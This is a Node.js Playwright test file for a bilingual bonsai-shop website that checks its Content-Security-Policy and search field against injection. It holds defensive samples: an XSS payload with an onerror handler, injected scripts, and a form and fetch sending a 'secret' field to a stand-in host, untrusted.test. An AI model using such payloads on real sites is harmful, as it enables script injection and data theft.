const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');
const {spawn} = require('node:child_process');
const {chromium} = require('playwright');
const root = path.resolve(__dirname, '..');
let checks=0, browser, server;
function check(value,message){assert(value,message);checks++;}
const policyPattern=/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/;
for(const name of fs.readdirSync(root).filter(name=>name.endsWith('.html'))){
 const html=fs.readFileSync(path.join(root,name),'utf8');
 const policy=html.match(policyPattern)[1];
 check(!/script-src[^;]*'unsafe-(?:inline|eval)'/.test(policy),name+' forbids unrestricted inline scripts and eval');
 check(html.includes('<meta name="referrer" content="strict-origin-when-cross-origin">'),name+' limits cross-site referrers');
 for(const match of html.matchAll(/<script\b([^>]*)>(.*?)<\/script>/gs)){
  if(/\bsrc\s*=/.test(match[1]))continue;
  const hash=crypto.createHash('sha256').update(match[2]).digest('base64');
  check(policy.includes("'sha256-"+hash+"'"),name+' authorizes only the exact existing inline script');
 }
}
(async()=>{try{
 browser=await chromium.launch({headless:true});
 const page=await browser.newPage();
 const attempts=[];
 const policyTag=fs.readFileSync(path.join(root,'index.html'),'utf8').match(policyPattern)[0];
 await page.route('**/*',route=>{
  const url=route.request().url();attempts.push(url);
  if(url==='https://bonsai3d.test/')return route.fulfill({contentType:'text/html',body:'<!doctype html><html><head>'+policyTag+'</head><body>'+ 
   '<script>window.inlineInjected=true</script><script src="https://untrusted.test/injected.js"></script>'+ 
   '<script src="/allowed.js"></script><script src="https://static.cloudflareinsights.com/beacon.min.js"></script>'+ 
   '<img src="/missing.png" onerror="window.handlerInjected=true">'+
   '<iframe src="https://untrusted.test/frame"></iframe><object data="https://untrusted.test/object"></object>'+ 
   '<base href="https://untrusted.test/"><form action="https://untrusted.test/collect"><input name="secret" value="synthetic-only"><button>Send</button></form></body></html>'});
  if(url==='https://bonsai3d.test/allowed.js')return route.fulfill({contentType:'application/javascript',body:'window.localAllowed=true;'});
  if(url==='https://static.cloudflareinsights.com/beacon.min.js')return route.fulfill({contentType:'application/javascript',body:'window.beaconAllowed=true;'});
  if(url==='https://bonsai3d.test/data')return route.fulfill({contentType:'text/plain',body:'local data'});
  return route.fulfill({status:404,body:''});
 });
 await page.goto('https://bonsai3d.test/',{waitUntil:'networkidle'});
 check(await page.evaluate(()=>window.localAllowed===true),'Existing same-origin JavaScript runs');
 check(await page.evaluate(()=>window.beaconAllowed===true),'Configured analytics script remains allowed (mock only)');
 check(await page.evaluate(()=>!window.inlineInjected&&!window.handlerInjected),'Injected inline script and event attribute do not run');
 check(await page.evaluate(()=>document.baseURI==='https://bonsai3d.test/'),'Injected base URL cannot redirect relative links');
 check(await page.evaluate(async()=>await(await fetch('/data')).text()==='local data'),'Same-origin catalogue requests remain allowed');
 check(await page.evaluate(async()=>{try{await fetch('https://untrusted.test/collect');return false;}catch{return true;}}),'Unexpected external data connection is rejected');
 await page.locator('form').evaluate(form=>form.requestSubmit());
 check(page.url()==='https://bonsai3d.test/','Unexpected native form submission is blocked');
 check(!attempts.some(url=>url.includes('untrusted.test')),'Blocked scripts, frames, objects, forms and fetches make no external request');
 const port=18867;
 server=spawn(process.env.PYTHON||'python3',['scripts/preview.py','--port',String(port)],{cwd:root,stdio:'ignore'});
 for(let i=0;i<100;i++){try{if((await fetch(`http://127.0.0.1:${port}/`)).ok)break;}catch{}if(i===99)throw Error('Preview did not start');await new Promise(r=>setTimeout(r,100));}
 const app=await browser.newPage();
 const external=[];
 await app.addInitScript(()=>{window.policyViolations=[];document.addEventListener('securitypolicyviolation',event=>window.policyViolations.push({directive:event.effectiveDirective,blocked:event.blockedURI}));});
 await app.route('**/*',route=>{if(new URL(route.request().url()).hostname==='127.0.0.1')return route.continue();external.push(route.request().url());return route.abort();});
 for(const name of ['index.html','collectie.html','atelier.html','maatwerk.html','service.html','privacy.html'])for(const lang of ['nl','en']){
  await app.goto(`http://127.0.0.1:${port}/${name}?lang=${lang}`,{waitUntil:'networkidle'});
  await app.locator('#main').waitFor();
  const violations=await app.evaluate(()=>window.policyViolations);
  check(violations.length===0,`${name} ${lang} has no policy violation: ${JSON.stringify(violations)}`);
 }
 const payload='\"><img id="injected-markup" src=x onerror="window.queryInjected=true">';
 for(const lang of ['nl','en']){
  await app.goto(`http://127.0.0.1:${port}/collectie.html?lang=${lang}&search=${encodeURIComponent(payload)}`,{waitUntil:'networkidle'});
  check(await app.locator('#product-search').inputValue()===payload,'Untrusted search text stays text in '+lang);
  check(await app.locator('#injected-markup').count()===0,'Search query cannot create injected DOM in '+lang);
  check(await app.evaluate(()=>!window.queryInjected),'Search payload does not execute in '+lang);
 }
 check(external.length===0,'Application security probes make no external requests');
 const report={status:'passed',checks,scope:'Controlled synthetic browser tests, no real attack requests or certificate bypass',attempts};
 fs.mkdirSync(path.join(root,'.artifacts'),{recursive:true});fs.writeFileSync(path.join(root,'.artifacts/security-tests.json'),JSON.stringify(report,null,2));console.log(JSON.stringify(report));
}catch(error){console.error(error.stack);process.exitCode=1;}finally{if(browser)await browser.close();if(server)server.kill();}})();
